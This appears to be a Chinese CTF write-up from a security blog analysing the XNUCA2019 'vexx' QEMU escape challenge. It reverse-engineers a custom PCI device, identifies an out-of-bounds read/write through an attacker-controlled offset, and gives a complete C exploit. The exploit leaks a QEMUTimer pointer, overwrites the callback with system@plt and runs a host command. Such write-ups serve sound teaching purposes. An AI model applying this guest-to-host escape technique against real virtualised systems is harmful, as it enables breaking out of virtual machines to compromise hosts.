#  初学QEMU虚拟化漏洞利用——XNUCA2019-vexx分析   
原创 LULU  红队蓝军   2024-10-18 18:02  
  
**QEMU 简介**  
  
**QEMU**（quick emulator）是一款由Fabrice Bellard等人编写的免费的可执行硬件虚拟化开源托管虚拟机（VMM）。  
  
QEMU允许用户模拟完整的计算机系统，包括处理器和各种外设，这样可以在一个主机系统上运行一个或多个客户操作系统。  
  
QEMU既可以作为虚拟机监控器，也可以作为仿真器使用。作为虚拟机监控器，QEMU能够创建并管理虚拟机，允许在宿主系统上同时运行多个客户机操作系统。作为仿真器，QEMU可以模拟处理器架构，允许在一个系统上运行不同架构的二进制程序。它也支持多种硬件架构，包括 x86、ARM、MIPS、PowerPC、SPARC 等。这使得QEMU成为跨平台的工具，可以在不同体系结构之间执行虚拟化和仿真  
  
QEMU是一个托管的虚拟机镜像，它通过动态的二进制转换，模拟CPU，并且提供一组设备模型，使它能够运行多种未修改的客户机OS，可以通过与KVM（kernel-based virtual machine开源加速器）一起使用进而接近本地速度运行虚拟机。  
  
QEMU内部网络分为两部分：  
- 提供给客户的虚拟网络设备（例如，PCI网卡）。  
  
- 与模拟NIC交互的网络后端（例如，将数据包放入主机的网络）。  
  
默认情况下，QEMU将为guest虚拟机创建SLiRP用户网络后端和适当的虚拟网络设备（例如e1000 PCI卡）  
  
**针对程序qemu-system-x86_64进行分析**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4w3J7mKlWejlrH3qgoT2iav6hbJHUK3MbrMypsX4FskDib8hqyWPic98MHqY9hKuhApiaIhVzB918J7Q/640?wx_fmt=png&from=appmsg "")  
  
使用IDA分析，查找vexx函数  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4w3J7mKlWejlrH3qgoT2iav0EGaM8MhOuOsj3puMnCksvbhznrbzmLGzyV0UicctIOF3j6RXED5LVw/640?wx_fmt=png&from=appmsg "")  
  
查看初始化函数vexx_class_init  
  
得到vendor_id是0x11e91234  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4w3J7mKlWejlrH3qgoT2iavZYppCJSyDgvCJxQBdN4vgb1vicgv9ae1WiaJ5eEjXXGRKzAbIk0ohE4Q/640?wx_fmt=png&from=appmsg "")  
  
继续分析pci_vexx_realize函数  
```
分析：
MMIO区域和I/O端口提供了与该自定义设备的交互
两个MMIO（内存映射I/O）区域被初始化，并与vexx_mmio_ops和vexx_cmb_ops相关联。访问MMIO区域时被调用。其中：
第一个mmio区域为：vexx_mmio_write和vex_mmio_read
第二个为MMIO区域的vexx_cmb_write和vexx_cmb_read
以及I/O端口的vexx_ioport_write和vexx_ioport_read

memory_region_init_io函数指定了vexx_mmio_ops和vexx_cmb_ops的大小。大小值可以确定在与这些MMIO区域交互时选择将适当的sysfs资源文件映射到内存中。
vexx_mmio_ops：0x1000
vexx_cmb_ops：0x4000

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4w3J7mKlWejlrH3qgoT2iav0Ee0LoM2JV4WHa4pIkbfVmQMOoCzedLQogH3rhBMv1EUibfFAVF2mFA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4w3J7mKlWejlrH3qgoT2iavk3JTDKicVrpCszGgwlbhib9ZHRQXiafgyYyW9vFhR5MHtib3KicCF2cne9A/640?wx_fmt=png&from=appmsg "")  
  
对MMIO区域和I/O端口涉及到的函数进行分析，在vexx_cmb_write函数中存在漏洞  
```
vexx_mmio_read以及vexx_mmio_write。这个结构对应的mmio地址是0xfebd6000，空间大小为0x1000。vexx_mmio_write里面addr为0x98可以触发dma_timer

```  
  
**vexx_cmb_write函数**  
  
在实例结构体中 req_buf 的大小为 0x100, 而 addr = offset + addr, 这里只检查了之前的 addr <= 0x100, 但是没有检查 offset+addr 是否越界, 而在 vexx_ioport_write 中是可以控制 offset 的, 从而导致越界写。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4w3J7mKlWejlrH3qgoT2iavSmN4l9rBrqKb1gAYzhsHSLwFeJkaaiaV6SpfTTnLKtvyIw8pgvjbtMA/640?wx_fmt=png&from=appmsg "")  
  
查看req.req_buf的定义  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4w3J7mKlWejlrH3qgoT2iavhsBADDsbm6cr7AlibDpOLTaNicXUfg3RoxwA3dzIW6sAdVvl18VC6D2Q/640?wx_fmt=png&from=appmsg "")  
  
如果paque->memorymode为1的时候，通过控制req.offset就可以实现对req.req_buf的越界  
  
看下设备实例结构体  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4w3J7mKlWejlrH3qgoT2iavDnLawBc2zB3N2uFEuhWxfvAACWAAZVkDtOWsV7K77OL1NvrHB1CTXg/640?wx_fmt=png&from=appmsg "")  
  
所以只要满足paque->memorymode为1，且对req.offset可控。很大概率能够逃逸  
  
在vexx_cmb_write函数中  
```
虽然限制param_2的大小在缓冲区的范围内,确保它不超过255字节（0x100），但param_2又被增加了一个偏移量，这个偏移量是一个由攻击者控制的值。通过查看与MMIO和端口I/O相关的其他函数，可以看到偏移量变量和memorymode值都可以通过写入特定的I/O端口来控制

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4w3J7mKlWejlrH3qgoT2iav6N4QeiaI1kzRqoaq6dbAO6NFzVvh3hOQjqEg3yPRreqpNO0FyUICPzw/640?wx_fmt=png&from=appmsg "")  
  
继续对I/O端口分析 ，vexx_ioport_read和vexx_ioport_write  
  
在vexx_ioport_write中  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4w3J7mKlWejlrH3qgoT2iav5UXU38vwvBZjN7r1e8vkwhowGrLBjUkHWKtYhxy8IAktZVeWGodYqA/640?wx_fmt=png&from=appmsg "")  
  
通过vexx_ioport_write设置req.offset以及opaque->memorymode。利用vexx_cmb_write对req.req_buf进行越界写，通过QEMUTimer来实现泄漏与利用。（同样vexx_cmb_read存在越界读）  
  
漏洞利用  
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <sys/io.h>
#include <sys/mman.h>
 
uint64_t mmio_addr = 0x00000000febd6000;
uint64_t mmio_size = 0x1000;
uint64_t cmb_addr  = 0x00000000febd0000;
uint64_t cmb_size  = 0x4000;
 
void * mmio_base;
void * cmb_base;
uint64_t pmio_base = 0x230;
 
void mmio_init()
{
        int fd = open("/dev/mem", 2);
        mmio_base = mmap(0, mmio_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, mmio_addr);
        if (mmio_base < 0) puts("[X} mmio_init at mmio"), exit(EXIT_FAILURE);
        if (mlock(mmio_base, mmio_size) < 0) puts("[X] mlock at mmio"), exit(EXIT_FAILURE);
        cmb_base  = mmap(0, cmb_size , PROT_READ|PROT_WRITE, MAP_SHARED, fd, cmb_addr );
        if (cmb_base < 0)  puts("[X] mmio_init at cmb"), exit(EXIT_FAILURE);
        if (mlock(cmb_base, cmb_size) < 0) puts("[X] mlock at cmb"), exit(EXIT_FAILURE);
        printf("[+] mmio_base: %#p\n", mmio_base);
        printf("[+] cmb_base: %#p\n", cmb_base);
}
 
uint32_t mmio_read(uint64_t offset)
{
        return *(uint32_t*)(mmio_base + offset);
}
 
void mmio_write(uint64_t offset, uint64_t val)
{
        *(uint64_t*)(mmio_base + offset) = val;
}
 
uint32_t cmb_read(uint64_t offset)
{
        return *(uint32_t*)(cmb_base + offset);
}
 
void cmb_write(uint64_t offset, uint32_t val)
{
        *(uint32_t*)(cmb_base + offset) = val;
}
 
void pmio_init()
{
        if (iopl(3) < 0) puts("[X] pmio_init"), exit(EXIT_FAILURE);
}
 
uint32_t pmio_read(uint32_t addr)
{
        return inl(pmio_base + (addr - 0x230));
}
 
void pmio_writel(uint32_t addr, uint32_t val)
{
        outl(val, pmio_base + (addr - 0x230));
}
 
void pmio_writew(uint32_t addr, uint32_t val)
{
        outw(val, pmio_base + (addr - 0x230));
}
 
void pmio_writeb(uint32_t addr, uint32_t val)
{
        outb(val, pmio_base + (addr - 0x230));
}
 
int main(int argc, char** argv, char** envp)
{
        mmio_init();
        pmio_init();
        /*
        puts("[+] outl");
        pmio_writel(0x240, 0x38);
        puts("[+] outw");
        pmio_writew(0x240, 0x38);
        */
        puts("[+] outb");
        pmio_writeb(0x240, 0x38);
        pmio_writeb(0x230, 1);
        uint64_t cb_addr = cmb_read(0x100);
        printf("[+] cb_addr: %#llx\n", cb_addr);
        pmio_writeb(0x240, 0x3c);
        pmio_writeb(0x230, 1);
        cb_addr = cb_addr | ((1ULL * cmb_read(0x100)) << 32);
        uint64_t system_plt = cb_addr - 0x00000000004DCF10 + 0x00000000002AB860;
        printf("[+] cb_addr: %#llx\n", cb_addr);
        printf("[+] system@plt: %#llx\n", system_plt);
 
        pmio_writeb(0x240, 0x40);
        pmio_writeb(0x230, 1);
        uint64_t arg_addr = cmb_read(0x100);
        printf("[+] arg_addr: %#llx\n", arg_addr);
        pmio_writeb(0x240, 0x44);
        pmio_writeb(0x230, 1);
        arg_addr = arg_addr | ((1ULL * cmb_read(0x100)) << 32);
        uint64_t cmd_addr = arg_addr + 0xb90;
        printf("[+] arg_addr: %#llx\n", arg_addr);
        printf("[+] cmd_addr: %#llx\n", cmd_addr);
 
        pmio_writeb(0x240, 0x38);
        pmio_writeb(0x230, 1);
        cmb_write(0x100, system_plt&0xffffffff);
        pmio_writeb(0x240, 0x3c);
        pmio_writeb(0x230, 1);
        cmb_write(0x100, (system_plt>>32)&0xffffffff);
 
        pmio_writeb(0x240, 0x40);
        pmio_writeb(0x230, 1);
        cmb_write(0x100, cmd_addr&0xffffffff);
        pmio_writeb(0x240, 0x44);
        pmio_writeb(0x230, 1);
        cmb_write(0x100, (cmd_addr>>32)&0xffffffff);
 
        char cmd[8] = "xcalc";
        pmio_writeb(0x240, 0);
        pmio_writeb(0x230, 1);
        cmb_write(0, *(uint32_t*)&cmd[0]);
        pmio_writeb(0x240, 4);
        pmio_writeb(0x230, 1);
        cmb_write(0, *(uint32_t*)&cmd[4]);
 
        mmio_write(0x98, 1);
 
//      puts("[-] DEBUG");
//      pmio_writeb(0x240, 0x38);
 
 
        return 0;
}
x

```  
  
  
加下方wx，拉你一起进群学习  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ibZ6uZjjH3v5KP8CaWoS7GAJnWQQxPpibNdibOdl0hc3X6uuBy7rLVOoxS0OSd4vdHWcibFpZg9T9Bx6T7Rn87RoIw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
